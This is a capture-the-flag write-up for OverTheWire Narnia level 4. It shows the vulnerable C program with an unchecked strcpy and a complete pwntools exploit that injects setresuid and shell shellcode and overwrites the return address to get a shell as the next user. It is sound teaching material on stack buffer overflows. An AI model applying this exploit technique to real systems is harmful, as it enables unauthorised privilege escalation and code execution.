---
title: Narnia4

published: 2025-06-21

description: Buffer overflow shellcode

tags: [pwn, buffer overflow]

category: overthewire-narnia
---

# Narnia 4

## C File

```c
extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```


## Approach

This is basically exactly the same as narnia2

If we make `argv[1]` large enough it will overflow and rewrite the return address

We make the return address back to the buffer filled with shellcode

## Solution

```python
from pwn import *
offset = 264
payload = asm(shellcraft.setresuid() + shellcraft.sh())
payload = payload + b'A' * (264-len(payload))
payload = payload + p32(0xffffd124)
p = process(["/narnia/narnia4", payload])
#p = gdb.debug(["/narnia/narnia4", payload], gdbscript="source /opt/gef/gdbinit.py")
p.interactive()
```

Again we find the offset using `cyclic` and the address to the buffer using `gdb`

then we just put the shellcode, fill up the buffer, and add the address of the buffer

We run it and get a shell as narnia5 and open the password file

## Conclusion

Again be careful with `strcpy` as its an easy way to cause a buffer overflow
